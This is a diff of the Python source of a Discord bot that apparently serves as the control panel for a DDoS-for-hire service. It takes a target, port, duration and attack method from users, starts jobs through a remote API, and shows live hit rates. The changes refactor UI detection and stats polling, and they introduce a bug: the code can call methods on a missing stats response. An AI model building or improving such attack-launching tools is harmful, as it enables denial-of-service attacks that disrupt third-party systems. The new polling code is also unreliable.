@@ -1,4 +1,3 @@
-
 # bot.py
 import asyncio
 import ipaddress
@@ -19,29 +18,32 @@ from config import (
 from database import Database
 
 # ═══════════════════════════════════════════
-# เลือก UI ตาม discord.py version
+# UI detection
 # ═══════════════════════════════════════════
 _HAS_V2 = (
     hasattr(discord, "MessageFlags")
     and hasattr(discord.MessageFlags, "components_v2")
+    and hasattr(discord.ui, "LayoutView")
+    and hasattr(discord.ui, "Container")
+    and hasattr(discord.ui, "TextDisplay")
 )
 
 _UI_MODE = "legacy"
-if _HAS_V2:
-    try:
+try:
+    if _HAS_V2:
         from ui_v2 import (
             build_panel, AttackModal, build_category_view,
             build_method_view, build_running,
         )
         _UI_MODE = "v2"
-    except Exception as e:
-        print(f"[UI] ui_v2 failed: {e}")
-
-if _UI_MODE == "legacy":
+    else:
+        raise ImportError("V2 not supported")
+except ImportError:
     from ui_legacy import (
         build_panel, AttackModal, build_category_view,
         build_method_view, build_running,
     )
+    _UI_MODE = "legacy"
 
 
 intents = discord.Intents.default()
@@ -237,7 +239,7 @@ async def show_method_panel(interaction, cat, target, port, dur):
     try:
         await interaction.response.edit_message(
             **build_method_view(cat, uid, target, port, dur))
-    except Exception as e:
+    except Exception:
         traceback.print_exc()
 
 
@@ -247,7 +249,7 @@ async def fire_attack(interaction, method, target, port, dur):
     try:
         await interaction.response.edit_message(
             **build_running(method, target, port, dur, dur, "..."))
-    except Exception as e:
+    except Exception:
         traceback.print_exc()
         return
 
@@ -294,12 +296,18 @@ async def _safe_edit(msg, kwargs):
         return
     try:
         await msg.edit(**kwargs)
+        return
     except Exception:
         pass
+    # fallback: ถ้า kwargs มี view ให้ลองแค่ view
+    if "view" in kwargs:
+        try:
+            await msg.edit(view=kwargs["view"])
+        except Exception:
+            pass
 
 
-async def _fetch_stats(job_id) -> dict:
-    """ดึงสถิติจาก API"""
+async def _fetch_stats(job_id):
     try:
         async with aiohttp.ClientSession() as s:
             url = f"{API_BASE}/status?key={API_KEY}&job_id={job_id}"
@@ -318,27 +326,22 @@ async def _tick(uid, state, method, target, port, dur):
         await asyncio.sleep(1)
         left = max(0, int(dur - (time.time() - st)))
 
-        # poll hits
         hits = 0
-        errors = 0
         speed_text = "running"
 
         if job_id:
             info = await _fetch_stats(job_id)
-            if info:
-                if not info.get("exists", True):
-                    # job หายแล้ว — หยุด loop
-                    break
-                hits = info.get("hits", 0)
-                errors = info.get("errors", 0)
-                elapsed = max(1, info.get("elapsed", 1))
-                rate = hits // elapsed
-                speed_text = f"{rate}/s"
+            if info and not info.get("exists", True):
+                break
+            hits = info.get("hits", 0)
+            elapsed = max(1, info.get("elapsed", 1))
+            rate = hits // elapsed
+            speed_text = f"{rate}/s"
 
         await _safe_edit(msg, build_running(
             method, target, port, left, dur, speed_text, hits))
 
-    # stop job
+    # stop
     if job_id:
         try:
             async with aiohttp.ClientSession() as s:
@@ -351,7 +354,6 @@ async def _tick(uid, state, method, target, port, dur):
 
     active_attacks.pop(uid, None)
 
-    # final
     final_hits = 0
     if job_id:
         info = await _fetch_stats(job_id)
